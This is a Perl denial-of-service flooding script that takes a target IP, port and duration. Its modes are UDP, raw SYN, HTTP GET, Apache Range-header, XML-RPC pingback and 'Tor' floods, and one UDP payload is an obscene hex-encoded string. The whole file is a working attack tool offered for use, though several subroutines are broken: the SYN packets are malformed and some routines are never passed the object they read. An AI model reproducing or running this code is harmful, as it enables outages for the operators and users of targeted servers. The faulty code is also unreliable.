#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Long;
use Socket qw(IPPROTO_TCP IPPROTO_IP IPPROTO_UDP IPPROTO_TCP SOCK_STREAM IP_HDRINCL SOCK_RAW SOCK_DGRAM PF_INET AF_INET inet_aton pack_sockaddr_in unpack_sockaddr_in);
use Time::HiRes;
use threads;

my $desenho = <<'ASCII';
    
ϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟ                                                       
ϟ_-_ _,,   ,,      ,      ,,                          ϟ
ϟ   -/  )  ||  '  ||      ||          '         _     ϟ
ϟ  ~||_<   || \\ =||= /\\ ||/\ ,._-_ \\  _-_   / \\   ϟ
ϟ   || \\  || ||  ||   /  ||_<  ||   || || \\ || ||   ϟ
ϟ   ,/--|| || ||  ||  /\\ || |  ||   || ||/   || ||   ϟ
ϟ  _--_-'  \\ \\  \\,  || \\,\  \\,  \\ \\,/  \\_-|   ϟ
ϟ (                    /                       /  \   ϟ
ϟ                     (,                      '----`  ϟ
ϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟ
by:kyr1o5 the leper
(H4nWay)


ASCII


my $ip;
my $port;
my $time;
my $attack_type = 'udp';  # Pode ser 'udp', 'syn', ou 'mcpe'

GetOptions(
    'ip=s' => \$ip,
    'port=i' => \$port,
    'time=i' => \$time,
    'type=s' => \$attack_type,
);

die "Usage: $0 --ip <target_ip> --port <target_port> --time <attack_time> --type <attack_type>\n"
  unless $ip && $port && $time && $attack_type;


my $objeto = {
    _port => $port,
    _target => {
        host => $ip,
        authority => $ip
    },
    _rpc => $time,  # usando o tempo como número de repetições
    _payload => 'GET / HTTP/1.1\r\n',
    randHeadercontent => 'User-Agent: Mozilla/5.0\r\n'
};



print($desenho);
print('Attacke!!');

my ($iaddr, $endtime, $psize, $pport);

$iaddr = inet_aton($ip) or die "Der Hostname konnte nicht aufgelöst werden. Bitte versuchen Sie es erneut $ip\n";
$endtime = Time::HiRes::time() + $time;
socket(my $flood, PF_INET, SOCK_DGRAM, IPPROTO_UDP);

my $size = 10000;

print "Drücken Sie STRG+C, um den Angriff zu stoppen\n";

if ($attack_type eq 'udp') {
    for (; Time::HiRes::time() <= $endtime; ) {
        $psize = $size ? $size : int(rand(1024 - 64) + 64);
        $pport = $port ? $port : int(rand(65500)) + 1;

        send($flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
    }
} elsif ($attack_type eq 'syn') {
    SYN();
} elsif ($attack_type eq 'mcpe') {
    MCPE();
}
  elsif ($attack_type eq 'tor'){
    TOR();

}
  elsif ($attack_type eq 'apache'){
    APACHE();
}
  elsif ($attack_type eq 'xml'){
    XMLRPC();

}
  elsif ($attack_type eq 'killer'){
    KILLER();
  }    
 else {
    die "Ungültiger Angriffstyp: $attack_type\n";
}



open(my $log, '>>', 'attack_log.txt') or die "Die Protokolldatei kann nicht geöffnet werden: $!";
print $log "Der Angriff endete em ", scalar localtime, "\n";
close $log;


sub SYN {
    my $s;
    socket($s, PF_INET, SOCK_RAW, IPPROTO_TCP) or die "Socket konnte nicht erstellt werden: $!";
    setsockopt($s, IPPROTO_IP, IP_HDRINCL, 1) or die "Socket-Option konnte nicht gesetzt werden: $!";

    
    my $dest_addr = pack_sockaddr_in($port, $iaddr);
    
    while (send($s, _genrate_syn(), 0, $dest_addr)) {
        next;
    }
    
    close($s);
}




sub MCPE {
    my $payload = "\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f".
                  "\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20".
                  "\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c".
                  "\x73";
    
    my $s;
    socket($s, PF_INET, SOCK_DGRAM, 0) or die "Socket konnte nicht erstellt werden: $!";
    
    my $dest_addr = pack_sockaddr_in($port, $iaddr);
    
    while (send($s, $payload, 0, $dest_addr)) {
        next;
    }
    
    close($s);
}



sub _genrate_syn {
    my $src_port = int(rand(65535 - 1024)) + 1024;  # Porta de origem aleatória
    my $seq_num = int(rand(4294967295));             # Número de sequência aleatório
    my $syn_packet = pack("nnNNH8nH2n", $src_port,  # Porta de origem
                                       80,           # Porta de destino (neste exemplo é 80 para HTTP)
                                       $seq_num,     # Número de sequência
                                       0,            # Número de ACK
                                       "A" x 8,      # Dados (8 bytes, apenas para preenchimento)
                                       2,            # Flags: SYN
                                       0);           # Janela de recepção

    return $syn_packet;
}

sub TOR {
    my ($self) = @_;

    my @tor2webs = qw(.onion);
    my $provider = $tor2webs[rand @tor2webs];

    my $target = $self->{_target}->{authority} // '';
    $target =~ s/\.onion/$provider/g;

    my $payload = $self->{_payload} . "Host: $target\r\n";

    if (ref($self) && eval { $self->can('randHeadercontent') }) {
        $payload .= $self->randHeadercontent . "\r\n";
    }

    my $s;

    my $raw_target = $self->{_raw_target} // [];
    my ($host, $port) = ($raw_target->[0] // '', $raw_target->[1] // '');

    my $target_address = $host;
    $target_address =~ s/\.onion/$provider/;

    my $dest_addr = inet_aton($target_address) or die "Hostname-Auflösung fehlgeschlagen: $!";
    my $dest_sock = pack_sockaddr_in($port, $dest_addr);

    socket($s, AF_INET, SOCK_STREAM, 0) or die "Socket konnte nicht erstellt werden: $!";
    connect($s, $dest_sock) or die "Verbindung fehlgeschlagen: $!";

    for (my $i = 0; $i < $self->{_rpc}; $i++) {
        send($s, $payload, 0);
    }

    close($s);
}





sub APACHE {
    my ($self) = @_;

    my $payload = "Range: bytes=0-,5-1023";
    my $s;

    socket($s, AF_INET, SOCK_STREAM, 0) or die "Socket konnte nicht geöffnet werden: $!";
    my $dest_sock = pack_sockaddr_in($self->{_port}, inet_aton($self->{_target}->{host}));

    connect($s, $dest_sock) or die "Verbindung fehlgeschlagen: $!";

    for (my $i = 0; $i < $self->{_rpc}; $i++) {
        send($s, $payload, 0);
    }

    close($s);
}

sub XMLRPC {
    my ($self) = @_;

    my $payload = <<"END_PAYLOAD";
Content-Length: 345\r
X-Requested-With: XMLHttpRequest\r
Content-Type: application/xml\r\n\r\n
<?xml version='1.0' encoding='iso-8859-1'?>
<methodCall><methodName>pingback.ping</methodName>
<params><param><value><string>ProxyTools::Random->rand_str(64)</string></value>
</param><param><value><string>ProxyTools::Random->rand_str(64)</string>
</value></param></params></methodCall>
END_PAYLOAD

    my $s;

    socket($s, AF_INET, SOCK_STREAM, 0) or die "Socket konnte nicht erstellt werden: $!";
    my $dest_sock = pack_sockaddr_in($self->{_port}, inet_aton($self->{_target}->{host}));

    connect($s, $dest_sock) or die "Connection failed: $!";

    for (my $i = 0; $i < $self->{_rpc}; $i++) {
        send($s, $payload, 0);
    }

    close($s);
}



sub KILLER {
    bless $objeto, 'Blitzkrieg';  # Abençoando o objeto com o pacote Blitzkrieg
    while (1) {
        GET($objeto);  # Passando o objeto correto para GET
    }
}





sub generate_payload {
    my ($self, $other) = @_;

    my $payload = $self->{_payload} . 
                  "Host: " . $self->{_target}->{authority} . "\r\n" .
                  $self->randHeadercontent() . 
                  ($other ? $other : "") . 
                  "\r\n";

    return $payload;
}

sub GET {
    my ($self) = @_;

    # Debug para verificar o objeto $self
    use Data::Dumper;
    

    # Verifique se os atributos necessários estão definidos
    unless (defined $self->{_port}) {
        die "Port attribute in GET nicht definiert!";
    }

    unless (defined $self->{_target}->{host}) {
        die "Host attribute in GET nicht definiert!";
    }

    my $payload = $self->{_payload} . 
                  "Host: " . $self->{_target}->{authority} . "\r\n" .
                  $self->{randHeadercontent} .  # Acessando o hash diretamente
                  "\r\n";

    my $s;

    socket($s, AF_INET, SOCK_STREAM, 0) or die "Socket konnte nicht geöffnet werden: $!";
    
    my $dest_sock = pack_sockaddr_in($self->{_port}, inet_aton($self->{_target}->{host}));

    connect($s, $dest_sock) or die "Verbindung fehlgeschlagen: $!";

    for (my $i = 0; $i < $self->{_rpc}; $i++) {
        send($s, $payload, 0);
    }

    close($s);
}







1;  # Finalizando o módulo
